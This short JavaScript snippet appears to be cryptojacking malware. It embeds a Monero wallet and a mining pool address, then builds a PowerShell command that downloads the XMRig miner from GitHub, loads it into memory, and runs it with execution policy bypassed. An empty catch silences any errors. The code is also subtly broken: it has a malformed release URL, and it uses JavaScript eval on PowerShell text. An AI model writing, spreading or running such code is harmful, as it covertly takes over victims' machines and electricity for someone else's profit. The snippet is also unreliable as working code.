try {
    const Wallet = '465HmcQMqXaib4ehERThvKMiKQDa584ZCVjRrwiUk5uoHPNjsxo7UJWRVCQDKGDQ3486JQXkhJcgSFR4nviLNtT9Ugm6HNv';
    const Pool = 'pool.hashvault.pro';

    const Command = `
        $wc=New-Object Net.WebClient;
        $url='https://github.com/xmrig/xmrig/releases/download/v6..msvc-win64.zip';
        $zip=$wc.DownloadData($url);
        $stream=New-Object IO.MemoryStream(,$zip);
        $archive=[IO.Compression.ZipFile]::OpenRead($stream);
        $entry=$archive.Entries|Where Name -eq 'xmrig.exe'|Select -First 1;
        if($entry){
            [byte[]]$data=New-Object byte[]($entry.Length);
            $s=$entry.Open();$s.Read($data,0,$data.Length);$s.Close();
            $assem=[Reflection.Assembly]::Load($data);
            start-process -filepath 'powershell' -ArgumentList '-exec bypass -c & {$assem.EntryPoint.Invoke($null,(,[string[]]@("-o ${Pool}:80 -u ${Wallet} --no-huge-pages")))}'
        }
        $archive.Dispose()
    `;
    
    eval(Command.replace(/\n/g,''));
    
} catch(e){}
